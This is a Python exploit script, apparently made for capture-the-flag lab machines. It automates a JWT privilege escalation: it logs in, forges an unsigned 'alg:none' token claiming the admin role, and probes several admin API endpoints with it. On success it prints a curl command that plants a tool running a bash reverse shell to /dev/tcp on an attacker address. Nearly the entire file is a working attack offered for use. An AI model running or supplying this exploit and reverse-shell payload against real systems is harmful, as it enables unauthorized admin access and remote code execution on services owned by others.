#!/usr/bin/env python3
"""
Box-Agnostic JWT Privilege Escalation
Automates: Login -> Check Admin -> Forge 'alg:none' Token -> Verify
"""

import requests
import json
import base64
import sys
import argparse
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def b64url(data):
    """Helper for base64url encoding without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_none_token(sub="attacker", role="admin"):
    """
    Forge a JWT with alg:none.
    Uses the exact logic requested.
    """
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"sub": sub, "role": role}).encode())
    token = f"{header}.{payload}."
    return token

def test_admin_access(target_url, token):
    """Test if the token grants admin access to a protected endpoint."""
    # Common admin endpoints to test
    endpoints = [
        "/api/v1/tools",
        "/api/v1/admin",
        "/api/v1/users",
        "/admin"
    ]
    
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        try:
            # Try a POST request (usually requires write/admin perms)
            resp = requests.post(url, json={"test": "data"}, headers=headers, verify=False, timeout=5)
            
            # If we get 200/201/204, we likely have access
            if resp.status_code in [200, 201, 204]:
                print(f"[+] Admin access confirmed on {endpoint} (Status: {resp.status_code})")
                return True
            
            # If we get 403/401, we are still blocked
            if resp.status_code in [401, 403]:
                continue
                
            # 422 (Validation Error) often means Auth worked but data was wrong
            if resp.status_code == 422:
                print(f"[+] Auth successful on {endpoint} (Status: 422 - Validation Error)")
                return True
                
        except Exception:
            continue
            
    return False

def exploit(target_url, username, password):
    """Main exploit chain."""
    
    # 1. Login to get initial JWT
    print(f"[*] Logging in as {username}...")
    login_url = f"{target_url}/api/v1/auth"
    
    try:
        resp = requests.post(
            login_url, 
            json={"username": username, "password": password},
            verify=False,
            timeout=10
        )
        
        if resp.status_code != 200:
            print(f"[-] Login failed: {resp.status_code}")
            return
            
        data = resp.json()
        if "access_token" not in data:
            print(f"[-] No access_token in response. Found keys: {list(data.keys())}")
            return
            
        user_jwt = data["access_token"]
        print(f"[+] Login successful!")
        
        # 2. Check if we are already admin or need escalation
        print(f"[*] Checking current privileges...")
        if test_admin_access(target_url, user_jwt):
            print("[!] User is already admin! No escalation needed.")
            print(f"Token: {user_jwt}")
            return

        print(f"[-] Admin access denied with user token. Attempting 'alg:none' bypass...")
        
        # 3. Forge 'alg:none' Token
        # We try to preserve the 'sub' (subject) from the original token if possible
        try:
            original_payload = json.loads(base64.urlsafe_b64decode(user_jwt.split('.')[1] + '=='))
            sub_claim = original_payload.get('sub', 'attacker')
            print(f"[*] Preserving original 'sub': {sub_claim}")
        except:
            sub_claim = 'attacker'
            print(f"[*] Could not decode original token, using default 'sub': attacker")

        forged_token = forge_none_token(sub=sub_claim, role="admin")
        
        print(f"\n[===] FORGED TOKEN (alg:none) [===]")
        print(forged_token)
        print(f"[============================]\n")
        
        # 4. Verify Access with Forged Token
        if test_admin_access(target_url, forged_token):
            print("[+] SUCCESS! 'alg:none' bypass worked.")
            print("\n[!] Usage Example:")
            print(f"curl -X POST {target_url}/api/v1/tools \\")
            print(f"  -H 'Content-Type: application/json' \\")
            print(f"  -H 'Authorization: Bearer {forged_token}' \\")
            print(f"  -d '{{\"name\":\"shell\",\"description\":\"rev\",\"code\":\"import os; os.system(\\'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1\\')\"}}'")
        else:
            print("[-] Bypass failed. The server likely validates the algorithm strictly.")
            print("[!] Try brute-forcing the secret key instead.")

    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Box-Agnostic JWT Escalation (alg:none)")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://10.10.10.10:8000)")
    parser.add_argument("-u", "--username", default="user", help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Box-Agnostic JWT 'alg:none' Escalation")
    print("=" * 60)
    
    exploit(args.target, args.username, args.password)

if __name__ == "__main__":
    main()   
